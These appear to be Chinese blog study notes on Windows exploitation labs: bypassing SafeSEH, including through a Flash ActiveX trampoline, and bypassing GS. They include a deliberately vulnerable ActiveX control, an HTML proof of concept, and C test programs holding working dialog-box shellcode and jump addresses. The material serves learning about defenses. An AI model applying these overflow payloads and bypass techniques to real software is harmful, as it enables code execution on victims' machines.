将异常处理函数指针覆盖为加载模块外的地址来实现对SafeSEH的绕过，然后通过除0触发异常程序转入异常处理，进而劫持程序流程。 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 DEP关闭 编译器 Visual Studio 2008 编译选项 禁用优化选项 build版本 release版本 实验内容： 获取数据：(溢出字符串起始位置0x0012FE88)(距离栈顶最近的异常处理函数句柄0x0012FF60+4) 使用OllyDbg插件OllyFindAddr，可以在整个程序的内存空间搜索。本实验使用call/jmp dword ptr[ebp+n]指令作为跳板。&quot;Plugins-&gt;OllyFindAddr-&gt;Overflow return address-&gt;Find CALL/JMP [EBP+N]&quot;来进行指令的搜索。 在0x00280B0B中找到了call [ebp+x030]的指令(但是0x00会被截断，如果是Unicode漏洞就不用考虑这个问题，因为Unicode的结束符号为0x0000) 使用两段跳的方式跳至shellcode起始处执行 通过一个2字节的短跳指令0xEBF6向回跳8个字节 在这8个字节中布置一条5字节的长跳转指令完成最终的回跳 shellcode组成： 168字节的弹出对话框机器码 40 * &quot;\\x90&quot; 长跳指令和0x90填充 &quot;\\xE9\\x2B\\xFF\\xFF\\xFF\\x90\\x90\\x90&quot; 短跳转指令和0x90填充 &quot;\\xEB\\xF6\\x90\\x90&quot; 跳板指令&quot;\\x0B\\x0B\\x28\\x00&quot; 5.3 验证及其思考由于一开始无法在0x00280B0B处设置断点，所以无法进入去查看,后来使用Animate into之后，能够在0x00280B0B处停止，方便我们调试。进入之后发现跳转指令直接跳转至SEH的链表指针所在地址，这就有我们 前面讲的shellcode来源。 6. 利用Adobe Flash Player ActiveX控件绕过SafeSEH该方法就是利用未启用SafeSEH模块绕过SafeSEH的浏览器版。Flash Player ActiveX在9.2.124之前的版本不支持SafeSEH，所以若我们能够在这个控件中找到合适的跳板地址，就可以绕过SafeSEH。 6.1 绕过SafeSEH需要三方面的支持 具有溢出漏洞的ActiveX控件 未启用SafeSEH的Flash Player ActiveX控件 可以触发ActiveX控件中溢出漏洞的POC页面 6.2 基于MFC的ActiveX控件建立好控件工程后，使用类视图中的&quot;VulnerAX_SEHLib-&gt;DVulnerAX-&gt;Add-&gt;Add Method&quot;，添加一个可以在Web页面中调用的接口函数，函数返回类型为void，函数名为test，参数类型为BSTR，参数名为str VulnerAX_SEHCtrl.cpp中的test函数 DWORD MyException(void) { printf(\"There is an exception\"); getchar(); return 1; } // CVulnerAX_SEHCtrl message handlers void CVulnerAX_SEHCtrl::test(LPCTSTR str) { //AFX_MANAGE_STATE(AfxGetStaticModuleState()); // TODO: Add your dispatch handler code here printf(\"aaaa\"); //定位该函数的标记 char dest[100]; sprintf(dest, \"%s\", str); int zero = 0; __try { zero = 1/zero; } __except(MyException()) { } } 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 编译器 Visual Studio 2008 优化 禁用优化选项 MFC 在静态库中使用MFC 工程属性-&gt;General-&gt;Use of MFC 字符集 使用Unicode字符集 工程属性-&gt;General-&gt;Character Set build版本 release版本 编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32 6.3 POC &lt;html&gt; &lt;body&gt; &lt;embed src=\"map.swf\" quality=\"high\" type=\"application/x-shockwave-flash\" width=\"160\" height=\"260\"&gt;&lt;/embed&gt; &lt;object classid=\"clsid:F010E769-5E95-4DBB-943D-AF2D1FE10C34\" id=\"test\"&gt;&lt;/object&gt; &lt;script&gt; var s = \"\\u9090\"; while (s.length &lt; 60) { s += \"\\u9090\"; } s += \"\\u0EEB\\u9090\"; s += \"\\uA0C6\\u021D\"; s += \"\\u9090\\u9090\\u9090\\u9090\"; s += \"\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857\"; test.test(s); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 这个代码和书上的不一致，但是完全正确。需要注意的是，我们使用的embed中的map.swf需要和该html在同一文件夹下，而object中的classid其实可以从VulnerAX_SEH.idl中找到。注意只能是下面代码中那处显示的uuid，其它位置处的都不行！！！ // Class information for CVulnerAX_SEHCtrl [ uuid(F010E769-5E95-4DBB-943D-AF2D1FE10C34), helpstring(\"VulnerAX_SEH Control\"), control ] coclass VulnerAX_SEH { [default] dispinterface _DVulnerAX_SEH; [default, source] dispinterface _DVulnerAX_SEHEvents; }; 6.5 实验内容实验思路： 在POC页面中随便插入一个Flash，让浏览器能够加载Flash控件 在POC页面中调用VulnerAX_SEH.ocx控件中的test函数，并向其传递超长字符串，以触发test函数中的溢出漏洞。 通过溢出手段将VulnerAX_SEH.ocx中的异常处理函数地址覆盖为Flash控件中的跳转地址。由于Flash控件没有启用SafeSEH，所以这个跳板地址可以绕过SafeSEH Test函数触发除0异常后，程序会去调用异常处理函数，由于异常处理函数地址已经被覆盖，所以劫持了程序流程。 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 浏览器 Internet Explorer 6 Flash控件版本 9.0.115.0 未启用SafeSEH的最后一版9.2.124 实验步骤： 修改POC，将s设置为90字节的0x90，用IE访问POC页面。 如果浏览器提示ActiveX控件被拦截等信息请自行设置浏览器权限，当浏览器弹出下图所示对话框，就可以用Ollydbg附加IE的进程（打开Ollydbg，点击File-&gt;attach，找到IExplorer进程，attach上去即可），附加好后按F9让程序继续运行 找到VulnerAX_SEH.ocx的内存空间，查找字符串&quot;aaaa&quot;，在此位置设置好断点0x100017DC（这是最近两天才发现的，设置断点一定要在CPU主界面设置，否则就设置不成功！）。我的方法如下图:先在Memory窗口中找到VulnerAX_SEH所在位置，然后搜索字符串&quot;aaaa&quot;，在rdata中找到了字符串，记下地址0x1003F9F8，再在.text中找字符串&quot;\\xF8\\xF9\\x03\\x10&quot;，就可以找到printf(&quot;aaaa&quot;)的位置 点击浏览器对话框中的&quot;是&quot;按钮，程序会中断在我们设置好的断点位置 单步执行完sprintf(0x100017F9)之后，得到数据：溢出字符串的起始位置0x0012E014；离栈顶最近的异常处理函数句柄在0x0012E08C+4。故需填充124(0x7C)个字节就可以覆盖到异常处理函数地址。 在Flash控件中搜索跳板指令。通过OllySEEH找到/SafeSEH OFF区域，如图所示。然后使用OllyFindAddr插件的Find CALL/JMP [EBP+N]选项来查找，最后在flash.ocx中找到了多条跳板。如图所示：我们使用0x021DA0C6处的CALL [EBP-0x18]作为跳板（不知道怎么回事，有些跳板地址用不了，当你输入0x02187625，但是进入函数之后跳板地址就变为了0x02137625） 程序执行跳板指令后，会回到SEH的链表指针所在地址。即&quot;\\u9090\\u9090\\uA0C6\\u021D&quot;处。 shellcode组成： 120字节0x90 60 * &quot;\\u9090&quot; 向后短跳16字节 &quot;\\u0EEB\\u9090&quot; Flash控件的跳板指令地址 &quot;\\uA0C6\\u021D&quot; 8字节的0x90填充 &quot;\\u9090\\u9090\\u9090\\u9090&quot; 168字节的弹出对话框机器码&quot;\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\\uff53\\ufc57\\uff53\\uf857&quot;","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"SEH","slug":"SEH","permalink":"http://yoursite.com/tags/SEH/"}]},{"title":"SafeSEH的保护原理以及攻击方法","date":"2017-07-07T12:05:58.000Z","path":"2017/07/07/SafeSEH的保护原理以及攻击方法/","text":"1. 启用SafeSEH通过启用/SafeSEH链接选项可以让编译好的程序具备SafeSEH功能 VS命令提示行，通过执行&quot;dumpbin /loadconfig 文件名&quot;就可以查看程序安全SEH表的情况。 可以通过&quot;程序-&gt;Microsoft Visual Studio 2008-&gt;Visual Studio Tools-&gt;Visual Studio 2008 Command Prompt&quot;启用 具有SafeSEH编译能力的VS 2008在编译程序时将程序中的异常处理函数的地址提取出来放到安全SEH表中 2. SafeSEH的保护措施 检查异常处理链是否位于当前程序的栈中，如果不在当前栈中，程序将终止异常处理函数的调用 检查异常处理函数指针是否指向当前程序的栈中。如果指向当前栈中，程序将终止异常处理函数的调用 在前面两项检查之后，程序调用全新的函数RtlIsValidHandler()，来对异常处理函数的有效性进行检验。 首先该函数判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，检校函数将依次进行如下判断： 判断程序设置IMAGE_DLLCHARACTERISTICS_NO_SEH标识。设置了，异常就忽略，函数返回校验失败。 检测程序是否包含SEH表。如果包含，则将当前异常处理函数地址与该表进行匹配，匹配成功返回校验成功，否则失败。 判断 程序是否设置ILonly标识。设置了，标识程序只包含.NET编译人中间语言，函数直接返回校验失败 判断异常处理函数是否位于不可执行页（non-executable page）上。若位于，校验函数将检测DEP是否开启，如若系统未开启DEP则返回校验成功；否则程序抛出访问违例的异常 如果异常处理函数的地址没有包含在加载模块的内存空间。校验函数将直接执行DEP相关检测，函数将依次进行如下检验： 判断异常处理函数是否位于不可执行页（non-executable page）上。若位于，校验函数将检测DEP是否开启，如若系统未开启DEP则返回校验成功；否则程序抛出访问违例的异常 判断系统是否允许跳转到加载模块的内存空间外执行，如允许则返回校验成功；否则返回校验失败 RtlIsValidHandler()函数的伪代码如下： BOOL RtlIsValidHandler(handler) { if (handler is in image){ //在加载模块内存空间内 if (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag ser) return FALSE; if (image has a SafeSEH table) //含有安全SEH表，说明程序启用SafeSEH if (handler found in the table) // 异常处理函数地址出现在安全SEH表中 return TRUE; else // 异常处理函数未出现在安全SEH表中 return FALSE; if (image is a .NET assembly with the ILonly flag set) //只包含IL return FALSE; } if (handler is on a non-executable page){ // 跑到不可执行页上 if (ExecuteDispatchEnable bit set in the process flags) //DEP关闭 return TRUE; else raise ACESS_VIOLATION; //抛出访问违例异常 } if (handler is not in an image){ // 在加载模块内存之外，并且在可执行页上 if (ImageDispatchEnable bit set in the process flags) // 允许在加载模块内存空间外执行 return TRUE; else return FALSE; } return TRUE; //前面所有条件都满足就允许这个异常处理函数执行 } 3. SafeSEH不能解决的问题 异常处理函数位于加载模块内存范围之外，DEP关闭 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH(安全SEH表为空)，同时相应模块不是纯IL 异常处理函数位于加载模块范围之内，相应模块启用SafeSEH（安全SEH表不为空），异常处理函数地址包含在安全SEH表中 分析三种情况的可行性： 只考虑SafeSEH，不考虑DEP干扰，需要在加载模块内存范围之外找到一个跳板指令就可以转入shellcode中执行 第二种情况中，我们可以利用未启用SafeSEH模块中的指令作为跳板，转入shellcode执行。这也是一再强调SafeSEH需要操作系统与编译器的双重支持。在加载模块中找到一个未启用SafeSEH模块不是很难 第三种情况下，可以考虑：a)清空安全SEH表，造成该模块未启用SafeSEH假象；b)将指令注册到安全SEH表中。由于安全SEH表的信息在内存中加密存放，所以突破它的可能性不大，放弃！！ 另外突破SafeSEH的方法 不攻击SEH。使用覆盖返回地址或者虚函数表等信息 利用SEH的安全校验的严重缺陷——如果SEH中的异常函数指针指向堆区，即使安全校验发现SEH不可信，仍会调用其已修改过的异常处理函数。 4. 名词解释4.1 DEPDEP 数据执行保护 (Data Execution Prevention)。数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码。在 Microsoft Windows XP Service Pack 2及以上版本的Windows中，由硬件和软件一起强制实施 DEP。 启用方法：修改C:\\boot.ini默认为: /noexecute=option /fastdetect //启用DEP修改为：/execute=option /fastdetect //关闭DEP 4.2 ILIL可以指Intermediate Language，同MSIL(Microsoft Intermediate Language),是将.NET代码转化为机器语言的一个中间语言的缩写。","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"SEH","slug":"SEH","permalink":"http://yoursite.com/tags/SEH/"}]},{"title":"汇编中常见指令解释","date":"2017-07-06T14:01:45.000Z","path":"2017/07/06/汇编中常见指令解释/","text":"这篇博文很有趣，竟然将hexo的content设置给冲垮了，感觉里面写了不可思议的东西，十分值得我去深挖！！！ 1. pop 和 push常见的汇编指令源码 pop机器码 含义 push机器码 含义 5f pop edi 57 push edi 5e pop esi 56 push esi 5d pop ebp 55 push ebp 5c pop esp 54 push esp 5b pop ebx 53 push ebx 5a pop edx 52 push edx 59 pop ecx 51 push ecx 58 pop eax 50 push eax 2. call call (short) eax 1.将当前指令的下一条指令的地址压入栈中； 2.JMP到EAX这个地址。 call (long) eax 1.将CS压入栈中； 2.将当前指令的下一条指令的地址压入栈中； 2.JMP到EAX这个地址。 3. retn 和 retf retn 1.将当前的ESP中指向的地址出栈； 2.JMP到这个地址。 retn k 1.将当前的ESP中指向的地址出栈； 2.JMP到这个地址； 3.弹出栈顶的k个字节的数据 retf 1.将当前的ESP中指向的地址出栈给EIP； 2.将当前的ESP中指向的地址出栈给CS； 2.JMP到这个地址。 4. jmp jmp短跳 \\xeb\\xf6: jmp short $-8（其中$指代当前EIP） 在Asm2MachineCode(x86)中如果要尝试jmp short $-8，是不可能实现的，但是我们可以： 1. ImageBase（hex）设置为0012ff60 (此处为当前的EIP地址) 2. jmp short 0012FF58 jmp长跳 \\xE9\\x2B\\xFF\\xFF\\xFF\\xFF: jmp 0x0012FF30 在Asm2MachineCode(x86)中如果要尝试jmp short $-8，是不可能实现的，但是我们可以： 1. ImageBase（hex）设置为0012ff58 (此处为当前的EIP地址) 2. jmp 0012FE88 5. cmpcmp op1, op2 ZF=1 这个简单，则说明两个数相等 当无符号时：CF=1 则说明了有进位或借位，cmp是进行的减操作，故可以看出为借位，所以，此时oprd1&lt;oprd2CF=0 则说明了无借位，但此时要注意ZF是否为0，若为0，则说明结果不为0，故此时oprd1&gt;oprd2 当有符号时：若SF=0，OF=0 则说明了此时的值为正数，没有溢出，可以直观的看出，oprd1&gt;oprd2若SF=1，OF=0 则说明了此时的值为负数，没有溢出，则为oprd1&lt;oprd2若SF=0，OF=1 则说明了此时的值为正数，有溢出，可以看出oprd1&lt;oprd2若SF=1，OF=1则说明了此时的值为负数，有溢出，可以看出oprd1&gt;oprd2 最后两个可以作出这种判断的原因是，溢出的本质问题：两数同为正，相加，值为负，则说明溢出两数同为负，相加，值为正，则说明溢出故有，正正得负则溢出，负负得正则溢出 6. leaveleave在32位汇编下相当于 12mov esp,ebp pop ebp 7. lesLES( load ES)指令的功能是：把内存中指定位置的双字操作数的低位字装入指令中指定的寄存器、高位字装入ES寄存器。 1234LES DSET，SRCLES REG，MEMDEST为destination(目的地址)，SRC为source(源地址)；REG为register(CPU寄存器)，MEM为memory(内存地址)。 DEST=WORD PTR[SRC] ES=WORD PTR[SRC+2] DEST赋值为SRC处双字的低位； ES赋值为SRC处双字的高位； 8. 比较A（above）大于、B（below）小于、E（equal）等于，用于比较无符号数 G（great）大于、L（less than）小于、E（equal）等于，用于比较带符号数 其实这些地方也是漏洞点，有时候比较没有对是否有符号进行确定，所以可能会出问题。 9. lods/stoslodsb指令，将esi指向的地址处的数据取出来赋给AL寄存器, esi=esi+1； lodsw指令则取得是一个字。 lodsd指令，取得是双字节，即mov eax，[esi]，esi=esi+4； stosb指令，将AL寄存器的值取出来赋给edi所指向的地址处。mov [edi]，AL；edi=edi+1； stosw指令去的是一个字。 stosd指令，取得是双字节，mov [edi]，eax；edi=edi+4；","tags":[{"name":"汇编","slug":"汇编","permalink":"http://yoursite.com/tags/汇编/"}]},{"title":"绕过GS安全编译的方法","date":"2017-07-04T05:51:38.000Z","path":"2017/07/04/绕过GS安全编译的方法/","text":"1.介绍GSVS设置GS开启：Project-&gt;project Properties-&gt;Configuration Properties-&gt;C/C++-&gt;Code Generation-&gt;Buffer Security Check 1.1 GS工作原理 在所有函数调用发生时，向栈帧中压入额外的随机DWORD，这个随机数被称作&quot;canary&quot;，在IDA中被标注为“Security Cookie”。 Security Cookie位于EBP之前，系统还将.data的内存区域中存放一个Security Cookie副本 当栈发生溢出时，Security Cookie将被首先淹没，之后才是EBP和返回地址 在函数返回之前，系统将执行额外的安全验证操作，即Security Check 在Security Check过程中，系统将比较栈中原先存放的Security Cookie和.data中副本的值，如果两者不吻合，说明栈帧中的Security Cookie已被破坏，即栈中已经溢出 当检测处溢出时，系统将进入异常处理流程，函数不会被正常返回，ret指令也不会被执行 1.2 不会使用GS的情况 函数不包括缓冲区 函数被定义为具有变量参数列表 函数使用无保护的关键字标记 函数在第一个语句中包含内嵌汇编代码 缓冲区不是8字节类型且大小不大于4字节 当然，也可以使用#pragma strict_gs_check(on)为任意类型的函数添加Security Cookie。 1.3 其他栈保护措施VS 2005及后续版本使用了变量重排技术，在编译时根据局部变量的类型对变量在栈帧中的位置进行调整，将字符串变量移动到栈帧的高地址。这样可以防止该字符串溢出时破坏其他的局部变量，同时还会将指针参数的字符串参数复制到内存中的低地址，防止函数参数被破坏。 1.4 Security Cookie生成细节 系统以.data节的第一个双字作为Cookie的种子，或原始Cookie（所有函数的Cookie都用这个DWORD生成） 在程序每次运行时Cookie的种子都不同，因此种子具有很强的随机性 在栈帧初始化以后系统用ESP异或种子，作为当前函数的Cookie，以此作为不同函数之间的区别，并增加 Cookie的随机性 在函数返回前，用ESP还原出（异或）Cookie的种子 1.5 GS优缺点 修改栈帧中函数返回地址的经典攻击将被GS机制有效遏制 基于改写函数指针的攻击，如C++虚函数的攻击，GS机制仍然很难防御 针对异常处理机制的攻击，GS很难防御 GS是对栈帧的保护机制，因此很难防御堆溢出的攻击 2. 利用未保护的内存突破GS这其实在前面已经介绍过，当缓冲区不是8字节类型且大小不大于4字节，系统是不会给予GS保护的，这时候就可以使用栈或堆溢出 3. 覆盖虚函数突破GS3.1 测试代码 #include \"stdafx.h\" #include \"string.h\" class GSVirtual{ public: void gsv(char *src) { char buf[200]; strcpy(buf, src); vir(); } virtual void vir() { } }; int main() { GSVirtual test; test.gsv( \"\\xfc\\x5e\\x97\\x7c\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xb0\\x9d\\x93\\x7c\" \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\" \"\\xF0\\x20\\x40\\0\" ); return 0; } 说明：shellcode中头部的0x7c992b04为&quot;pop edi, pop esi, retn&quot;指令的地址，不同版本的系统中该地址可能不同 3.2 实验原理实验思路： 类GSVirtual中的gsv函数存在典型的栈溢出漏洞 类GSVirtual中包含一个虚函数vir 当gsv中的buf变量发生溢出的时候有可能影响虚表指针，如果可以控制虚表指针，将其指向我们可以控制的内存空间，就可以在程序调用时控制程序的流程。 实验环境 推荐使用环境 备注 操作系统 Windows XP SP3 编译器 Visual Studio 2008 编译选项 禁用优化选项 build版本 release版本 为了能够精准地淹没虚函数表，test.gsv中传入参数&quot;\\x90&quot;*199+&quot;\\0&quot;，在执行strcpy之后暂停此时栈帧内容为 从栈帧中可以看出，距离虚函数表地址还有20字节的内容。然后考虑一下执行过程，控制虚表指针后，可以让程序跳到虚表指针指向的虚表函数地址中去执行（即jmp [虚表指针内容]）。过程如图，程序根据虚表指针找到虚表，然后从虚表中取出调用的虚函数地址，根据这个地址转入虚函数执行。 变量buff在内存中的位置不是固定的，需要考虑如何让虚表指针刚好指向shellcode的范围内。虽然原始参数为（0x004020F0）是位于虚表（0x004021C0）附近，所以我们直接淹没虚表地址。 虚表指针指向原始参数中的shellcode后，紧跟着一个call操作，也就是说还需要在执行这个call后还必须返回shellcode空间继续执行，这儿有个办法就是直接进入栈空间中的buff内执行shellcode。 从图中可以看出，此时Buff的地址存放在0x0012FE9C，位于ESP+4的位置，我们只要执行&quot;pop pop retn&quot;指令序列后就可以转到0x0012FE9C中执行。我们找到了ntdll.dll在0x7C975EFC处的&quot;pop esi, pop edi, retn&quot;指令。 但是在虚函数执行此地址处的函数指令的时候，retn之后会重新跳入栈顶指针0x7C975EFC处继续执行一遍&quot;pop esi, pop edi, retn&quot;指令 为了能够让程序执行shellcode中关键内容，我们让这次执行&quot;pop pop retn&quot;后程序进入ntdll.dll中0x7c939db0中执行&quot;push esp, retn&quot;指令 这时候执行push esp就将shellcode中的地址传入栈中，然后retn后就执行shellcode中内容 本次执行的过程与《0day安全》上讲的不一样，总觉得书上这个地方讲错了 4. 攻击异常处理突破GS4.1 测试代码 #include \"stdafx.h\" #include \"string.h\" char shellcode[] = \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\xA0\\xFE\\x12\\x00\"; void test(char *input) { char buf[200]; strcpy(buf, input); strcat(buf, input); } int main() { test(shellcode); } 4.2 实验原理实验思路 函数test存在典型的栈溢出漏洞 在strcpy操作后变量buf会被溢出，当字符串足够长的时候程序的SEH异常处理句柄会被淹没 由于strcpy溢出，覆盖了input的地址，会造成strcat从一个非法地址读取错误，这会触发异常，程序进入异常处理，这样就可以在程序检查Security Cookie前将程序流程劫持 实验环境 推荐使用环境 备注 操作系统 Windows 2000 SP4 编译器 Visual Studio 2005 Windows 2000最高支持VS2005 编译选项 禁用优化选项 build版本 release版本 测试步骤 首先用&quot;\\x90&quot;*199+&quot;\\0&quot;作为shellcode，按照实验环境编译，用OllyDbg加载程序，在程序执行strcpy后中断程序执行完之后，发现shellcode起始位置为0x0012FEA0，距离栈顶最近的SEH位于0x0012FFb0+4。于是知道shellcode起始位置到最近的SEH句柄需要276字节。 shellcode: 168字节弹出对话框shellcode + 108*&quot;\\x90&quot; + &quot;\\xA0\\xFE\\x12\\x00&quot; 5. 同时替换栈中和.data中的Cookie突破GS5.1 实验代码 #include \"stdafx.h\" #include \"string.h\" #include \"stdlib.h\" char shellcode[] = \"\\x90\\x90\\x90\\x90\" // new value of cookie in .data \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\xF4\\x6F\\x82\\x90\" // result of \\x90\\x90\\x90\\x90 xor EIP \"\\x90\\x90\\x90\\x90\" \"\\x94\\xFE\\x12\\x00\"; // address of shellcode void test(char *s, int i, char *src) { char dest[200]; if(i&lt;0x9995) { char *buf = s+i; *buf = *src; *(buf+1) = *(src+1); *(buf+2) = *(src+2); *(buf+3) = *(src+3); strcpy(dest, src); } } void main() { char *str = (char *)malloc(0x10000); test(str, 0xffff3094, shellcode); } 5.2 实验原理实验思路： main函数在堆中申请了0x10000字节的空间，并通过test函数对其空间的内容尽心操作 